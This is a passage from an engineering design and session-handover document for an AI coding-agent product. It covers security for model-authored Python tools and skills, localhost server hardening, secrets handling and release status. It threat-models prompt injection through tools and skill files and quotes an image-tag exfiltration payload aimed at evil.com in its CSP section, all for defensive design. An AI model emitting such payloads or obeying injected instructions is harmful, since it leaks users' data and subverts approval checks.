  change, per-call timeout, kill-and-restart on hang. This implies a **single shared venv**,
  so cross-tool dependency conflicts are possible — a documented, accepted tradeoff.
- **Validate before registering:** `ast.parse`, import, generate schema. On failure return
  the traceback to the model to fix.
- Registered as a third tool provider alongside built-ins and MCP, reusing the same
  registry, namespacing (`py__*`), and approval.

### Security — this is the sharpest surface in the project

Everything else gates *calling* a tool. This makes the **body** model-authored, so an
injected instruction can create a persistent, later-auto-approved code path.

- **Create/update requires approval showing full source diff.** Ground truth.
- **Content hash pinned** in the registry; refuse to load on unapproved change.
- **Tools directory defaults inside the workspace** (`.lightcode/tools/`) so changes land
  in git and get code-reviewed. This is a real mitigation.
- **Never pass provider API keys into the Python environment.** Minimal inherited env.
- `uvPath`, `toolsDir`, `venvPath` are user-scope only (invariant 5).
- Network egress from tool code is uncontrollable without a real sandbox. Document it.
- **Opt-in by default**, with `dynamicTools: "off"` supported.

### Skills

Markdown with frontmatter (`name`, `description`).

- **Only `name` + `description` go in the system prompt.** Bodies are read on demand via
  the existing `read_file` — no dedicated `load_skill` tool needed. This keeps baseline
  cost at a few tokens each and lets skills reference other files and grow arbitrarily.
- **The Skills tab names the standing-instructions skill, or offers to create it** (0.43.0). The
  flag shipped with no way to see or set it, which made a per-request cost invisible and
  hand-edit-only — and `always: true` mistyped does nothing at all, silently.
- **A skill with `always: true` in its frontmatter is injected in full, every session** (0.41.0,
  user-requested as "a master skill"). It bypasses both the summary list and retrieval, because a
  standing instruction that only arrives once the model suspects it needs one has arrived too
  late to change the decision. Paid for on every request, so it is opt-in and should be short.
- **Two file layouts are read**: `skill-name.md`, which is what `write_skill` produces, and
  `skill-name/SKILL.md`, which is what Claude and Claude Code use. The second was added
  2026-09-01 because a folder of skills copied from there was *entirely invisible* with no error
  anywhere — reported as "I don't see the existing skills listed". The folder names the skill
  unless frontmatter says otherwise. The folder watcher is recursive for the same reason.
- A skill file is a **persistent prompt-injection vector** — prose nobody code-reviews.
  Writes go through approval; plain markdown in git is the main defence.

---

## 14. Node host and browser UI

**Built.** `apps/host` — `npx @chosengeneration/light-code` starts a server on 127.0.0.1 and opens the
browser over the same core, the same bridge and the same `packages/ui`. Every requirement
below is implemented and verified against the running process, not merely reasoned about;
`apps/host/src/security.test.ts` pins the checks and `docs/hosting.md` is the operator
documentation.

**The npm name is scoped because `light-code` was already taken** by an unrelated package.
The installed command is still `light-code`. Scoped packages default to restricted, so
`publishConfig.access: "public"` is set — without it the first publish 402s asking for a
paid plan, which reads as a billing problem rather than a missing flag.

### Admin and user modes — **`apps/host` only** (2026-08-2x)

User-requested, and the scope fence is theirs and explicit: *"this is only for node version"*,
*"i dont want this seperation of admin to be reflecting in vsix"*. The VS Code extension has one
user who owns their own machine; a role split there would be theatre.

- `light-code --admin` prints a second, separate URL. The assumption the user granted is that
  **only admins can reach the admin URL** — the split is an operator control, not a defence
  against someone who already has the admin link.
- **`apps/host/src/roles.ts` is an allow-by-omission list, deliberately.** A settings message
  added later must default to *restricted*, so `isAdminOnly` also applies a prefix rule
  (`save*`/`delete*`/`set*` is admin unless listed as personal). A deny list would silently
  admit every new control.
- What it covers mirrors invariant 5 almost exactly: the shared provider set and the default a
  new user inherits, MCP servers, Python, search connections, schedules, read roots, the
  dispatcher. A second user on a shared box is the same threat as a hostile repository arriving
  through a different door.
- What is deliberately *absent* is as considered: appearance, mode, the per-chat expert budget
  and the message being typed are personal. An admin has no business owning them.
- **A user's own profiles are theirs** — a reversal of the first draft, which froze all of
  `profiles`. The threat invariant 5 is about is one party repointing *another's* gateway, and a
  per-user profile cannot do that: someone bringing their own key spends their own money against
  a host they chose.
- **Session variables**: user-level and admin-level, both exposed to a session as environment
  variables, **admin wins on collision**. They live in `variables.json`, not `config.json` — the
  zod schema strips unknown keys, so putting them in the config file meant the next unrelated
  save deleted them. There is a test asserting that stripping, so the reason stays visible.
- **A normal user's tool or skill goes to a review queue** (`reviewQueue.ts`); only an admin
  approves. §13 requires approval showing the source, and on a shared server the person who can
  give that approval is not the person who asked for it.
- **None of this makes multi-user hosting safe.** The agent still runs as the service account,
  so this is not privilege isolation and `docs/hosting.md` still says hosting is only appropriate
  where every user is already trusted with everything every other user can reach. **Do not soften
  that because roles now exist** — they lock down configuration, not execution.

**`--guide` serves the operator documentation as a web page**, not as terminal output. It bakes
`docs/hosting.md` into the bundle at build time (`guideHtml.ts`), so there is no network fetch
and invariant 4 holds. Note the renderer works on CRLF input: `.` in a JS regex does not match
`
`, and the markdown file is CRLF, so the first version silently rendered no headings at all.

**`scripts/smoke-test-npm.mjs` is the VSIX smoke test's counterpart and exists for the same
reason.** It packs the tarball, installs it into an empty directory with plain `npm`, and
runs it. A workspace hoists every dependency and links every sibling, so `@light-code/core`
listed as a `dependency` — it is bundled, and unpublished — would break every real install
while passing every local check. Run `pnpm verify:npm` before publishing.

Two decisions worth not relitigating:
- **SSE + POST, not a WebSocket.** A WS upgrade is *not* subject to CORS, so origin
  enforcement has to be hand-written in the upgrade handler and a mistake there is silent.
  Two ordinary HTTP requests get the browser's own rules for free. `EventSource` is unusable
  because it cannot set an `Authorization` header — the token would have to travel in the
  query string, which is exactly what the fragment handoff exists to avoid. A streamed
  `fetch` can set headers, so that is what the client uses.
- **Identity is a seam from day one.** `IdentityProvider` returns a `Principal`, and every
  store is keyed by `Principal.id`, so config, secrets, task history and spilled tool
  results are already per-user. Adding SSO changes who the principal is and nothing else.

**Multi-user hosting is NOT safe yet, and the gap is not the code.** The agent runs shell
commands and spawns MCP servers as **the service account**, so SSO buys attribution and
storage isolation but *not* privilege isolation: on a shared server any user can have the
agent read any file that account can reach, including another user's `secrets.json`. The
real fix is one OS account or container per session, with the server as a supervisor. Until
that exists, hosting is only appropriate where every user is already trusted with everything
every other user can reach. `docs/hosting.md` states this in those terms; do not soften it.

The original specification follows, kept because it is what was built against.

`npx light-code` starts a local Node server and opens the system browser. Same core, same
`packages/ui`, served over HTTP rather than loaded into a webview.

**A localhost server that reads files and spawns shells is a genuine attack surface** — any
page the user has open can send requests to `127.0.0.1`. Required, not optional:

- Bind literal `127.0.0.1` (not `localhost` — resolution varies and can dual-stack), port `0`.
- **Two-stage token handoff**: launch URL carries a single-use ~10s handoff token in the
  fragment; page POSTs it to `/api/session` for a session token; page calls
  `history.replaceState` to strip the fragment. Long-lived tokens must never be in a URL.
- **Bearer header, not a cookie.** Cookies are attached automatically, which is exactly
  what CSRF exploits.
- **Validate `Origin`** (CSRF) **and `Host`** (DNS rebinding) on every request. Rebinding
  passes the Origin check — the Host header is what catches it.
- **WebSockets are not subject to CORS.** Reject foreign origins in the upgrade handler
  manually. Token via `Sec-WebSocket-Protocol` or a mandatory first message with a 2s
  timeout.
- **Strict CSP**: `default-src 'none'; script-src 'self'; img-src 'self' data:;
  connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'`.
  The `img-src` and `connect-src` restrictions block the classic exfiltration trick where
  model output contains `<img src="https://evil.com/?d=...">`.
- Sanitize markdown rendering (DOMPurify, no raw HTML, `rel="noopener noreferrer"`).

Also needed: a non-`SecretStorage` backend (DPAPI via native module on Windows, `security`
on macOS, libsecret on Linux, restricted-permission file as fallback) — which is why
`SecretStore` is async and reports its backend.

Electron only if the browser version proves insufficient. `npm` distribution of native
binaries, if ever needed, uses the platform-specific `optionalDependencies` pattern
(as esbuild and swc do). RPM/deb/AppImage are electron-builder CI targets, not a decision
to make now.

---

## 15. Config and secrets

### Config

**Core owns the config file, not VS Code.** One JSON file per scope, read/written through
the `Config` interface. The host supplies the path (`globalStorageUri` for user scope,
`.lightcode/config.json` for workspace). The settings UI is a front-end over that file, so
the Node host later gets the same UI for free.

Expose only a couple of things in VS Code's own settings (config path override, log level)
so the extension still feels native.

- **One schema** (zod) used by both the UI and the file loader, so a hand-edited file and a
  UI save fail identically. Field-level errors inline.
- **Scope is visible in the UI.** User-scope-only fields (invariant 5) must not offer a
  workspace toggle, and if found in workspace config, show an "ignored (user-scope only)"
  badge rather than dropping them silently.
- **Live reload** — watch the file so hand-edits and UI edits behave the same.
- **Import/export** with secrets stripped and cert paths preserved. Colleagues will want to
  share a working gateway config.

**Config writes are atomic and serialised. This is not a detail (added 2026-09-01, from a real
corruption).** A user's `config.json` was destroyed while the junior assessment was saving, and
the visible symptoms were "the expert is no longer detected", "my approvals are being asked
again" and "my skills are gone" — three unrelated-looking reports from one broken file, which
only hand-editing JSON could repair.

Two causes, both structural:
- **`fs.writeFile` straight onto the live file.** It truncates first, so anything that
  interrupts it leaves invalid JSON. Every read then throws, and because `save` reads before it
  writes, the product cannot even repair itself. `ConfigStore.write` now writes a sibling and
  renames, which is one filesystem operation: the file is the old contents or the new one.
- **`save` is read-modify-write with an `await` in the middle.** Two concurrent calls both read
  the old contents and the second discards the first. `ConfigManager` serialises per scope.

And because neither guarantee covers a machine losing power: **a file that will not parse is
restored from the last good copy**, the damaged one is moved aside rather than deleted, and the
user is told. The backup is written *after* the live file and from the same contents, so it
exists from the first save rather than the second. **A hand-edit that merely fails validation
still throws** — that is a mistake the user just made in a file they are looking at, and
silently reverting it would be worse help than naming the field.

The same reasoning applies to any other file this product owns. `taskStore`, `fileSecretStore`
and `reviewQueue` already wrote temp-and-rename; config was the one that did not.

### Secrets

Secrets are: provider API keys, Apigee `client_secret`, cert passphrases, MCP server env
values, and issued OAuth tokens. **Not** secrets: base URLs, cert *paths*, model names,
`uvPath`.

- **VS Code:** `SecretStorage` (DPAPI/Keychain/libsecret). Config holds **references** only:
  `{ "apiKeyRef": "profile:gateway:apiKey" }`. Namespace keys so deleting a profile
  reliably deletes its secrets — orphans otherwise accumulate invisibly.
- **Write-only across the bridge** (invariant 7). UI renders "Set — replace?", never a
  masked value round-tripped from the host.
- **Never in the config file, never in exports, never in logs.** A single redaction helper
  applied to all logging and error paths, keyed on known secret values plus patterns for
  `Bearer` tokens and `sk-`-style keys. HTTP libraries love to echo request headers.
- **Fetch at request time**, cache within a request, drop after. Failure to resolve a ref
  produces "credential missing for profile X — reconfigure", not an unauthenticated request.
- **Never in the Python or MCP environment** unless that server was explicitly configured
  to receive one.
- Deletion is real. Provide "clear all stored secrets".
- The UI states which backend is active. Do not imply keychain-grade protection when it's a
  file.

### Audit log

Append-only: every tool execution (timestamp, tool, arguments, approved/auto) and every
token acquisition (timestamp, endpoint, success, expiry — **never the token**). Cheap to
build, invaluable for trust, debugging, and enterprise review.

---

## 16. Windows

Primary development platform. These are silent-failure sources, not preferences.

- **Line endings** — see §7. `.gitattributes` with `* text=auto eol=lf`;
  `core.autocrlf=input`.
- **Path confinement** must resolve symlinks *and* compare case-insensitively:
  ```js
  const real = await fs.realpath(requested)
  const norm = s => process.platform === 'win32'
    ? path.resolve(s).toLowerCase() : path.resolve(s)
  if (!norm(real).startsWith(norm(root) + path.sep)) throw new Error('outside workspace')
  ```
  Prefix-matching the *unresolved* path is the classic bug. Also handle drive-relative
  paths (`C:foo`), UNC, `\\?\` prefixes, and 8.3 short names.
- **Spawning `.cmd`/`.bat`** — `uv`, `npx`, `pnpm` are shims on Windows. Node requires
  `shell: true`, which reintroduces argument-injection risk. Resolve to the real `.exe`
  where possible; keep a hardcoded allowlist of spawnable shims; **never interpolate
  model-supplied strings into a shell-spawned command line.**
- **Process termination** — `child.kill()` does not kill grandchildren. Use
  `taskkill /PID <pid> /T /F` or a Job Object. Without this you leak orphaned processes
  constantly.
- **Shell** — `pwsh` if present, else `cmd`, configurable. PowerShell 5.1 does not support
  `&&`; PowerShell has its own chaining and subexpression syntax. Hence no command
  auto-approve on Windows in v1.
- **venv layout** — `.venv\Scripts\python.exe`, not `bin/python`. Behind a helper from day one.
- **Config paths** — `%APPDATA%\light-code\`. Use `env-paths`, don't hand-roll.
- Long paths and Developer Mode enabled; Defender exclusions for the repo and pnpm store.

---

## 17. Conventions

- TypeScript strict. No `any` without a comment justifying it.
- Vitest. ESLint flat config + Prettier. Changesets for versioning.
- esbuild for the extension bundle.
- Conventional commits.
- **Errors are for humans.** Every user-facing error names what failed, which file or host
  was involved, and what to do next.
- Prefer fewer, more general tools over many narrow ones — it directly reduces context cost
  and improves selection accuracy.
- New platform-specific behaviour goes behind an interface (§4), not inline.

### Commands

```bash
pnpm install --ignore-scripts   # --ignore-scripts is deliberate; see invariant 4
pnpm build
pnpm test
pnpm lint
pnpm typecheck
pnpm package                    # produces .vsix
```

CI matrix includes `windows-latest` from the first commit, plus a network-isolated job
proving a full session works with no route to the internet.

---

## 18. Where we deliberately differ from Roo

Record the reason, not just the difference.

| Difference | Reason |
|---|---|
| Greenfield, not a fork | Roo is archived; no upstream fixes. Minimalism is the product. |
| Deterministic matching, no fuzzy threshold | Roo's Levenshtein matcher produced both false rejections and silent-misapply risk. |
| One wire adapter in v1 (all three from Phase 7) | Gateway fronting is the deployment; avoids auditing SDKs for hidden endpoints. Anthropic and Gemini landed in Phase 7, still hand-written over `HttpClient` rather than via their SDKs, for the same reason. |
| `@` mentions resolved host-side, not as a tool | The user named the path, so there is nothing for the model to decide and nothing to approve. Confinement and the deny list still apply, because the path is user-typed text rather than a capability. |
| Exact-match command allowlist, no patterns | Pattern matching requires tokenising PowerShell correctly, and a bug there auto-approves a chained destructive command. Byte-for-byte matching needs no parser, so it is safe on every platform — see §8. |
| No browser tool | Out of scope. Browser access, if wanted, is a user-configured MCP server — not something we ship. |
| ~~No semantic search~~ — **reversed 2026-08-09** | Originally excluded because embeddings conflict with the offline posture. The user overrode it: the deployment context is an organisation with an internal gateway, where an internal vector store and embedding endpoint break nothing, and codebase indexing is a capability Roo shipped and people use. Now Phase 8b — opt-in and disabled by default, so the offline posture holds for anyone who leaves it off. Both original objections survive as constraints rather than blocks; see §12. |
| Three vector backends behind one interface, no vendor SDKs | Invariant 2 sends all egress through core's `HttpClient`, and the OpenSearch/Qdrant/Chroma clients each carry their own HTTP stack. All three databases are plain REST, so thin hand-written clients are the required design, not a workaround. |
| Dynamic Python tools + skills | New capability Roo did not have. |
| Scheduled prompts, read-only by default | New capability Roo did not have. Unattended runs have nobody to approve anything, so they get a restricted mode rather than inheriting auto-approve — Phase 9b. Since 2026-09-01 a run may always *discover* (`search_docs`, `call_tool`, `read_tool_result`), because none of those reaches the workspace, the network or a process — and a hit it may not call is marked as such rather than hidden. Note a granted tool is advertised to a run directly, even one that is `dispatchOnly` in the chat: the schedule's registry is built fresh from the allowlist. |

---

## 19. Status

Update this section every session.

**`wireChatBridge` lives in `packages/core/src/host/`, not in a host.** It was in
`apps/vscode` and imported `vscode` directly, which meant the Node host had to fork or move
1,800 lines — the plan's own words: if the port needs changes in core, that is a bug in the
Phase 1 interfaces. The coupling turned out to be 14 call sites, nearly all dialogs and
toasts, now `HostUi`. **Its contract is that no method may be load-bearing:** a browser has
no native picker, so `showOpenDialog` returns `undefined` — indistinguishable from a cancel —
and every path field stays typeable. That is why the Browse buttons were built as an
addition to the text input rather than a replacement for it.

**Current phase:** **Shipped and in daily use in a corporate deployment**, which is now where
most changes come from. Published to the Visual Studio Marketplace by manual upload — the Azure
DevOps org creation demanded an Azure subscription, so `VSCE_PAT` does not exist and the Release
workflow has never run. **0.36.1 was live as of 2026-08-31**, published 2026-08-27, queried from
the gallery. The local manifest is **0.44.0**, built and unpublished:
`apps/vscode/light-code-vscode-0.44.0.vsix` (universal, six ripgrep binaries, smoke test green).

Every previous edition of this paragraph was stale, several of them by many releases, and each
was repeated to the user as fact. Query the gallery.

Also on npm: `@chosengeneration/light-code` (the Node host, §14). **0.12.1 is live as of
2026-08-31**; the local manifest is **0.20.0**. The bare name `light-code` belongs to an unrelated
package, hence the scope. **Publishing automation is not wanted** — the user decided against it
on 2026-08-19 and manual upload stays, for both registries.

**Check the gallery rather than this file before claiming a published version** — the query is
`POST https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery` with
`filterType 7` and the extension id. This paragraph was stale for several versions and got
repeated as fact.

Since release, driven by real use in a corporate deployment: 0.1.1 (VS Code floor lowered to
1.84), 0.1.2 (CA file and skip-verify for any profile; Qwen/Gemma; inline capability
overrides; screenshot paste), 0.2.0 (profile selector, Claude CLI expert, model
self-identification), 0.3.0 (reasoning traces, expert markers, icons, composer layout),
0.3.1 (an explicit request to consult the expert now wins over the frugality guidance),
0.4.0 (changelog).

**Next:** publish the pending versions — extension 0.44.0, host 0.20.0 — and keep working from
what the office deployment reports. The plan phases are done; changes now come from daily use.

**`git push` had not run for 97 commits** when it was finally noticed on 2026-08-31. Nothing was
lost, but everything built since `7a04504` existed only on one machine for weeks. Push at the end
of a session.

**TLS material is configured once, globally (added mid-Phase-8b, from the corporate
deployment).** There were four places to put a CA — top-level `certDir`, a profile's `tls`,
the Apigee auth block's `certs`, and an OpenSearch connection — which is not flexibility but
three chances to miss one. A `tls` block now sits at the top level (user-scope only,
invariant 5: a workspace able to add a trusted root could intercept the gateway
undetectably), and `platform/connectionTls.ts` is the single resolver every connection goes
through. Three merge rules, each chosen against a concrete failure:
- **CAs accumulate.** A CA on one connection must not cost the user the corporate root that
  makes every *other* connection work.
- **Client identity is taken as a unit.** A connection naming its own `certFile` supplies
  the whole pair, so it can never end up with one side's certificate and the other's key —
  a handshake failure whose message points at neither file the user edited.
- **`rejectUnauthorized` is most-specific-wins in both directions**, so a connection can
  re-enable verification that was switched off globally. An override that only ever loosens
  is not an override.

**A client certificate is offered globally too, and that is a real decision, not a
convenience.** It is a credential: presenting it identifies you to whatever you connect to.
But a corporate machine genuinely has one machine certificate for all internal services, and
every host here is one the user configured. So it applies by default, any connection can
replace it, and `useGlobalClientCertificate: false` withholds it from one endpoint. Paths the
resolver reads are reported back and join the tool deny list (invariant 6) — a globally
configured key is exactly as readable as a per-profile one. Settings → **Network** is a new
tab, and it also exposes `certDir`, which until now was hand-edit only.

**Phase 9 part one done — Python tools are wired and visible (0.8.2).** `uv` detection, a
shared venv, a persistent JSON-RPC worker, the hash-pinned registry, `create_python_tool` /
`update_python_tool` / `delete_python_tool`, and a Python tab. Off by default.
- **The registry is the security boundary, not the approval prompt.** Approval records a hash
  of the exact source shown in the diff; a file whose hash no longer matches is refused and
  reported. A `.py` with no registry entry never loads at all — the tools directory is inside
  the workspace so changes get code-reviewed, which also means a cloned repo can contain one.
- **A created tool becomes callable on the *next* message, not later in the same turn**, and
  the success message says so. Tool definitions must stay byte-stable for a whole turn or the
  prompt-cache prefix dies (§12) — so the alternative was not "available sooner", it was
  "cache invalidated on every tool creation".
- **The worker source is inlined into the bundle** and written to disk at runtime.
  `scripts/generate-python-worker.mjs` generates it from `worker/main.py`, and a test fails if
  they drift. esbuild does not copy `.py`, and resolving a path relative to the bundle is
  exactly what shipped a dead VSIX once.
- Verified against real Python 3.13 and uv 0.11 end to end: create → approve → call → edit
  outside → refused. Also: syntax error returns a traceback and rolls the file back, a hang is
  killed at its budget with no orphan interpreter, and `minimalPythonEnv` is an allowlist that
  a test proves excludes five planted key-shaped variables.
- **`confine` takes (requestedPath, root), and the path must be absolute.** Passing a bare
  filename resolved it against the process CWD — caught only by running it, since the unit
  tests covered the registry rather than the tool wrapper.

**Not built yet in Phase 9:** skills (markdown with frontmatter, name+description into the
prompt, bodies via `read_file`). And **the Python tab has never been opened in a real
Extension Host** — the whole path was driven from a script.

**Phase 9 complete (0.10.0): Python tools and skills.** On top of the worker and registry:
create/update/delete tools, the Python tab, project-venv reuse, PEP 723 dependency
installation, and skills.
- **The project's own virtualenv is preferred over creating one**, detected from `pyvenv.cfg`
  (`uv =` marks a uv-created env). That is where a team's *internal libraries already live*;
  a private venv is empty, and a tool importing a company package would fail in a way that
  looks like a Light Code bug rather than a missing install. The tradeoff — tool dependencies
  install into the user's project — is stated in the tab, not hidden.
- **PEP 723 dependencies were declared but never installed.** The model was told to write them
  and nothing acted on it, so a tool needing a library died on an `ImportError` from inside
  the worker. They now install *before* validation, so the failure names the package and the
  index. `python.indexUrl` points at an internal mirror; `offline` refuses the network.
- **Skills are the answer to "teach it about our internal libraries".** Markdown in
  `.lightcode/skills/`, only name+description in the prompt, bodies via `read_file` — no
  `load_skill` tool, exactly as §13 says. The *maintaining* half is prompt guidance: offer
  when the user explains something durable, ask first, check the list before duplicating, and
  offer to correct a skill when something contradicts it, because a stale skill is worse than
  a missing one.
- Skills load once per turn before the prompt is built and are then fixed, like tool
  definitions and for the same cache reason (§12). Load order is sorted for that reason too.

**The `VectorStore` seam exists now (2026-08-14), and it is two interfaces rather than one.**
That is not tidiness: the read/write split between `OpenSearchClient` and
`OpenSearchIndexWriter` is a security property — the object a tool receives has no write
method to call — and a single `VectorStore` interface would have handed `search_codebase` an
`upsert`. So `VectorSearcher` is what tools get, `VectorIndexWriter` is what the indexer gets,
and `rag/vectorStoreFactory.ts` builds them through **separate functions** so no caller
wanting a read can reach a write.
- **`search_docs` (the raw-DSL OpenSearch tool, `search_opensearch`) stays outside the seam.**
  Querying the organisation's existing indexes has no Qdrant or Chroma counterpart, and
  forcing it through a neutral interface means inventing a query language and translating it —
  which §11 names as a silent-failure source. It is offered only when the active store is
  OpenSearch, so a future backend means the tool is *absent*, not present and broken.
- Adding Qdrant is now: an adapter, a `case` in the factory, and a string in
  `vectorStoreKindSchema`. The compiler names the third if you forget it.
- The kNN request body moved out of `search_codebase` into the adapter. It was the one
  OpenSearch-shaped thing in a tool, and it had **no test coverage at all** before this.

**Vector-store backends: sequencing decided 2026-08-13.** The user reconfirmed wanting Qdrant
and Chroma as alternatives to OpenSearch, for codebase indexing *and* potentially for skills.
Agreed order: **verify OpenSearch against a real cluster first, then build the `VectorStore`
seam and Qdrant, then decide about skills.** This is the plan's own argument — three backends
built before one is validated is how all three end up mediocre.
**Note the seam does not exist yet.** The plan assumed a `VectorStore` interface was keeping
the option open; it is not — `rag/opensearch/*` is concrete and `vectorStoreSchema.kind` is
`z.literal('opensearch')`. Adding Qdrant therefore starts with extracting that abstraction.

---

## The walkthrough is generated, not written (2026-08-20)

`contributes.walkthroughs` in `apps/vscode/package.json` is **produced**, and its diagrams come
from `scripts/generate-walkthrough-art.mjs`. Three things about it are load-bearing:

- **A step about a tab must be able to open that tab.** `lightCode.openSettings` takes a tab id;
  the description carries `[Open the X tab](command:lightCode.openSettings?%5B%22x%22%5D)`. This is
  the difference between a tour and a document, and `walkthrough.test.ts` asserts it for all eleven
  tabs. The command is hidden from the palette — it is useless without its argument.
- **The message is held until the webview is live.** `reveal` returns long before React mounts, so
  `WebviewTransport.postWhenLive` keeps one navigation and flushes it on the first *inbound*
  message, which proves the script is running. Only navigation may be held this way; holding state
  would deliver something stale to a view that has since rebuilt itself from the host.
- **The diagram spec is a copy of the UI's field names.** When a tab gains a setting, add a row in
  the generator. A diagram that omits a field teaches that the panel is smaller than it is.

The guide button lives in the **chat header**, not in Settings — help reachable only after you have
navigated is help for people who no longer need it.

`SettingsNavigation.test.tsx` renders all eleven tabs with nothing configured. That path barely
existed before: the walkthrough now sends people directly into tabs they have never opened, and
four of them threw on a missing array when it was first written.

---

## SESSION HANDOVER — 2026-09-01, read this first

**Marketplace 0.36.1, npm 0.12.1** (queried 2026-08-31). Local manifests **0.41.0** and
**0.17.0**, built and unpublished; the artifact is `apps/vscode/light-code-vscode-0.41.0.vsix`.
`main` is clean and pushed. **1420 tests**, 1 skipped.

### A UI lesson worth not repeating

**Do not paint over a text input.** Mention highlighting was built as a coloured copy of the text
behind a textarea with transparent glyphs — the standard trick — and it broke typing: the caret
sat behind the last character. Two independently laid-out layers cannot be relied on to agree to
the pixel across fonts and zoom, **and nothing automated in this repo can see that they have
stopped agreeing.** The replacement puts the highlight *outside* the input, as chips under it.
Where a feature's correctness is only visible to a human eye, prefer the design that cannot be
wrong over the one that looks better when it happens to work.

### Excel and Outlook are built (§12c)

Decided the same day they were raised: PowerShell/COM in core rather than Python tools, because it
adds no dependency and no bundled bytes — the whole feature is about 25KB in the VSIX. Opt-in, off,
Windows only, user-scope only. §12c has the reasoning and the two traps that each cost a debugging
round. **Outlook's search and read paths have never run against a live mailbox** — that is the
first thing to check when someone has Outlook open.

### The most important thing found this session

**An ordinary save could destroy `config.json`, and the product could not repair itself.** The
user hit it: the expert stopped being detected after a junior assessment, and they fixed the JSON
by hand with Claude in their office. §15 now carries the rule and the reasoning.

Note the *shape* of the report, because it will recur: three separate-sounding complaints — the
expert gone, approvals asked again, skills missing — were one broken file. **When several
unrelated settings appear to have been forgotten at once, suspect the file, not the features.**

Their live config is worth knowing: `approvals` holds one key, `d:\Developments\test`, and there
is **no `skills` and no `filesystem` block at all** — consistent with a configured skills folder
having been lost in that corruption.

### The bug shape that keeps costing the most time

**One fact declared in two places, which drift.** Two more instances since the last handover:
`retrieval?.dispatcher === true` in two bridge paths where `dispatcherEnabled()` owns the
default, so tools were hidden by one path while their documentation was never indexed by
another. `config/retrieval.test.ts` now reads `bridge.ts` and fails on a direct read of the key.

The fix is always the same: **one owner of a default, one constructor, and pass the whole thing
rather than copying fields.** Where a test can see the shape rather than the behaviour, write it.

### Built this session

- **Config safety** (§15): atomic writes, saves serialised per scope, recovery from the last good
  copy with the damaged file kept aside and the user told. Tested in memory *and* against a real
  filesystem — the in-memory one forces overlap with a delay, which is what actually catches it.
- **`ask_user_form`** (§6b): typed input — string, number, boolean, choice, list — answered as a
  tool result so the turn continues. Not skills-only; the user was explicit about that.
- **Skills as `name/SKILL.md`** (§13), the layout Claude uses. A folder of them was invisible with
  no error to notice.
- **Scheduled runs can discover** (§9b additions in `schedule/types.ts`): `search_docs`,
  `call_tool` and `read_tool_result` are always available, because none of them reaches the
  workspace, the network or a process. `search_docs` marks a hit the run may not call, so it
  reports what it needed instead of spending a step being refused.
  **A correction worth keeping**, because it was asserted before it was measured: `call_tool` was
  claimed to fix a schedule being unable to invoke a granted MCP tool. It does not — a schedule
  registers its granted tools *plainly*, so they are advertised to the run directly even when
  they are `dispatchOnly` in the chat. `call_tool` only makes `search_docs`'s own "call it with"
  instruction work. `schedule/discovery.test.ts` now pins the real behaviour.
- **Junior mode reports what it has avoided** (§12b): three windows, every figure a floor with
  its derivation on the page. The temptation here was a large persuasive number; the reason it
  is not one is written into `expert/savings.ts` and should stay written down.
- **The `@` picker ranks instead of truncating.** It asked the file index for thirty and showed
  those thirty, so truncation chose rather than the query. `context/mentionRanking.ts`.
- **Mentions are coloured in the composer** — a highlight layer behind the textarea, sharing one
  layout constant, because the two only line up while they agree exactly.
- **Approvals are matched however the workspace path is spelled.** Windows hands back `d:\x` and
  `D:\x`; a JSON key is exact, so "always allow" was silently forgotten. §16's rule reaching the
  one place that stored a path as a key rather than comparing it.
- **`filesystem.excludeFromMentions`**, defaulting to the usual build and virtualenv folders. The
  original bug: a non-null `exclude` **replaces** `files.exclude` rather than adding to it.
- **The documentation index is reachable from the MCP tab**, where you are when you add a server.

### Answers to standing questions, so they are not re-derived

- **Scheduled runs get skills**, and since this session can *search* for them too — except when
  the schedule named an `allowedSkills` set, where listing is how that choice is honoured.
- **A shared vector index across a team is workable.** Indexed paths are workspace-*relative*, so
  different drive letters are not the obstacle. What is: `codebaseIndexName()` hashes the absolute
  path (set `embedder.indexName` on both machines), the embedding model and width must match, and
  manifests are per user so the second person re-embeds. The user withdrew the request believing
  paths made it impossible — they do not.
- **MCP tool documentation is indexed**, and reindexes on connect, disconnect and
  `tools/list_changed`, debounced and fingerprinted.
- **The 25-step cap is per turn.** Replying "continue" grants a fresh 25.
- **Python-tool creation and skill writing always ask**, whatever is auto-approved
  (`ALWAYS_ASK_TOOLS`). Being asked repeatedly for *those* is by design, not a bug.

### Still not done

`MANUAL_VERIFICATION.md` is still largely unrun and is still the oldest debt. Both registries are
behind. Admin UI for shared profiles is still reserved with no handler. No render test for
`ReviewsTab`. And the standing warning holds: **most of this has never been rendered in a real
Extension Host** — jsdom proves behaviour, not appearance. The two most likely to look wrong are
the form and the composer highlight layer: the highlight is two stacked layers that must align
exactly, and nothing automated can see whether they do.

---

## Previous handover — 2026-08-31, superseded above

**Marketplace 0.36.1** (published 2026-08-27), **npm 0.12.1** — both queried 2026-08-31, not
inferred. This session versioned **0.37.0** (extension) and **0.13.0** (host) and packaged
`apps/vscode/light-code-vscode-0.37.0.vsix` (universal, six ripgrep binaries, smoke test green).
Neither is published. `main` is clean. **1323 tests**, 1 skipped.

### The bug shape that has now cost this project more time than any other

**One fact declared in two places, which drift.** Four instances this session, three of them
found only because the user said the feature did nothing:

- Two `settings` posts built the capability list separately, so `--guide` reached one host and
  not the other. Fixed with a shared `hostCapabilities()`.
- Two `expert` messages were constructed separately, so measured pricing reached the success
  path and not the failure path. Fixed with a shared `expertMessageFrom()`.
- `App.tsx` unpacked the expert message **field by field**, so every field added to the protocol
  was silently dropped on the way to the panel. This is the one that survived three rounds of
  inspection: the host was correct, the protocol was correct, and the UI was quietly discarding
  the answer. Fixed by assigning the whole message.
- Two dispatcher checks read `retrieval?.dispatcher === true` instead of `dispatcherEnabled()`.
  Both were written while the default was off and became wrong when it flipped — tools hidden by
  one path, documentation never indexed by another. **This is the answer to "sometimes I have to
  tell it which tool to use."**

The general fix is the same every time: **one constructor, one owner of a default, and pass the
whole thing rather than copying fields.** Where a test can see the shape rather than the
behaviour, write that test — `config/retrieval.test.ts` reads `bridge.ts` and fails on a direct
read of the key, because a decision that never reaches its owner is invisible to any test of the
owner.

### The habit that found all of them

**Read the running system.** The user's `config.json` (`retrieval: {dispatcher: true}`, no vector
store, no embedder) explained the tool-selection complaint. The output channel named the layer of
the pricing bug in one line after three rounds of source inspection had not. A stub CLI
(`scratchpad/fakecli/claude.cmd`, emitting the real JSON envelope) proved the cost measurement
without spending the user's credit. Live two-user servers verified the admin split.

### Built since 0.30

- **Multi-user for `apps/host` only** — admin/user URLs, `--admin`, roles, per-user and admin
